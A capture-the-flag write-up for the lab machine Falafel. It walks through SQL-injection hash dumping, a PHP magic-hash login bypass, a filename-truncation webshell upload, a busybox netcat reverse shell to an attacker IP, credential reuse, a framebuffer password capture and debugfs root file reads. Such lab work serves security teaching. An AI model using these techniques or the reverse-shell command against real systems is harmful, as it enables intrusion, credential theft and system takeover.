#Linux #PHP #SQLi #SQLMap #PHPTypeJuggling #UploadBypass #FilenameTruncation #busybox #credentialhunting #VideoGroup #framebuffer #debugfs #DiskGroup

## Overview

Falafel is a hard Linux box with a layered web attack chain followed by a creative privilege escalation route. SQL injection dumps password hashes; a PHP type-juggling bug bypasses the admin login; a filename-length truncation trick converts a `.php.png` upload into a live PHP webshell. Lateral movement relies on credential reuse from the web app's database config. Root comes from membership in the `disk` group, which grants raw read access to the block device via `debugfs`.

## Recon

### Directory Enumeration

The site runs PHP on Apache 2.4.18. Two GoBuster passes were needed: the first with the `.php` extension, the second with `.txt` (hinted by robots.txt disallowing all `.txt`):

```sh
gobuster dir -u http://10.129.229.139/ -w /path/to/big.txt -x php
/login.php   (Status: 200)
/upload.php  (Status: 302)
/uploads     (Status: 301)
/connection.php  (Status: 200)
```

```sh
gobuster dir -u http://10.129.229.139/ -w /path/to/directory-list-2.3-medium.txt -x txt
/cyberlaw.txt  (Status: 200)
```

`cyberlaw.txt` was an email from the site admin to lawyers and devs describing how a user named `chris` had bypassed the login and used the image upload for full site control:

```
From: admin@falafel.htb
A user named "chris" has informed me that he could log into MY account without knowing
the password, then take FULL CONTROL of the website using the image upload feature.
```

Two valid usernames identified: `admin`, `chris`.

### Username Enumeration via Error Message Differences

Invalid usernames returned "try again...", while valid ones returned "Wrong Identification: \<username\>". Wfuzz confirmed both accounts:

```sh
wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt \
  -d "username=FUZZ&password=abcd" -u http://10.129.229.139/login.php --hh 7074
000000086: admin
000001886: chris
```

## Foothold

### SQL Injection → Password Hashes

Saving the login POST request and running SQLMap with time-based blind payload detection:

```sh
sqlmap -r request.txt --level 5 --risk 3 --batch --string "Wrong identification" --dump
```

Output from `falafel.users`:

```
admin  | 0e462096931906507119562988736854
chris  | d4ee02a22fc872e36d9e3751ba72ddc8  (juggling)
```

SQLMap cracked chris's hash inline. The admin hash remained unsolved by the default dictionary, but its value is the key.

### PHP Type Juggling to Log In as Admin

Chris's password `juggling` and the hash value `0e462096931906507119562988736854` are both hints. PHP's loose comparison (`==`) compares values after type coercion. If both sides look like scientific notation (`0e...` followed by digits), PHP treats them as `0 * 10^n = 0` on both sides, so they compare equal regardless of the actual string.

> **Magic hash attack:** `0e462096931906507119562988736854` starts with `0e` and is all digits, so PHP evaluates it as `0.0`. If we supply a password whose MD5 hash also starts with `0e` and is all digits, PHP's `md5($input) == $stored_hash` evaluates as `0.0 == 0.0`, which is `true`. The magic number `240610708` has this property.

Logging in as `admin` with the password `240610708` succeeded.

### Image Upload, Filename Truncation Bypass

The admin panel includes an upload feature that fetches an image from a URL. Extension filtering blocked `.php` uploads. Probing with varied input showed the app uses `wget` to fetch the URL, and the filename is derived from the URL path.

The hint was the admin profile motto "Know your limits." Supplying a URL with a very long filename triggered a different error message. Experimenting to find the exact character limit:

```python
URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*232 + ".php.png"')
```

At 240 total characters the filename is truncated:

```
The name is too long, 240 chars total. Trying to shorten...
New name is AAAA...AAAA.php
```

> **Why truncation beats the filter:** the extension check runs before `wget` fetches the file. By naming the file `<232 A's>.php.png`, the check sees `.png` and passes. Then `wget` saves it, but the filesystem path is limited to 255 characters; with the upload-directory prefix eating some characters, the `.png` suffix is silently dropped, leaving a `.php` file on disk.

PoC after upload:

```sh
curl "http://10.129.96.7/uploads/<timestamp>_<hash>/AAA...AAA.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Full shell using busybox nc (no special characters):

```sh
busybox nc 10.10.14.167 53 -e /bin/bash
```

```sh
rlwrap nc -lvnp 53
connect to [10.10.14.167] from (UNKNOWN) [10.129.96.7] 37154
whoami
www-data
```

## Privilege Escalation

### www-data → moshe (Credential Reuse)

`connection.php` in the web root held the database credentials:

```php
define('DB_USERNAME', 'moshe');
define('DB_PASSWORD', 'falafelIsReallyTasty');
```

These credentials worked for local login:

```sh
su moshe
# Password: falafelIsReallyTasty
whoami
moshe
```

### moshe → yossi (Framebuffer Screenshot)

`moshe` is in the `video` group. Running a group-file sweep found `/dev/fb0` (the framebuffer device) readable:

```sh
cat /dev/fb0 > /dev/shm/.z/screenshot.raw
cat /sys/class/graphics/fb0/virtual_size
1176,885
```

> **The framebuffer trick:** `/dev/fb0` exposes the raw pixel data of whatever is currently displayed on the physical console. Members of the `video` group can read it. `yossi` was logged in on `tty1`, so the framebuffer contained their active session. Copying it as a raw image and opening it in GIMP (File > Open As > Raw Image Data, `RGB565`, 1176x885) rendered the screen content, including a visible password.

The framebuffer raw file was transferred back to Kali via `scp` and opened in GIMP as RGB565. The rendered screenshot showed `yossi`'s password:

```
yossi:MoshePlzStopHackingMe!
```

SSH'd in as `yossi`:

```sh
ssh yossi@10.129.96.7
```

### yossi → root (disk group / debugfs)

`yossi` is in the `disk` group. Identifying the root partition:

```sh
blkid
/dev/sda1: UUID="ccba94d2..." TYPE="ext4"
/dev/sda2: UUID="..." TYPE="swap"
```

> **disk group = raw filesystem access:** members of `disk` can read raw block devices. `debugfs` is a filesystem debugger that can open a block device directly and navigate it like a mounted filesystem, bypassing all permission checks at the OS level. Any file on the partition, including `/root/root.txt` or `/etc/shadow`, is readable.

```sh
debugfs /dev/sda1
debugfs:  cat /root/root.txt
‹redacted›
```

## Root

Box rooted via `debugfs`.

## Takeaways

- **PHP type juggling is a real login bypass.** Any hash starting `0e` followed by digits evaluates to zero under loose comparison; the magic number `240610708` is the canonical exploit value.
- **Filename length limits can truncate extension filtering.** Build long filenames that push the dangerous extension past the truncation point and the safety check sees only the benign suffix.
- **The `video` group can read the framebuffer** (`/dev/fb0`) and expose whatever is on the physical console, including plaintext passwords typed in other sessions.
- **The `disk` group effectively grants root-equivalent read access.** `debugfs` on a raw block device bypasses all Linux file permissions.
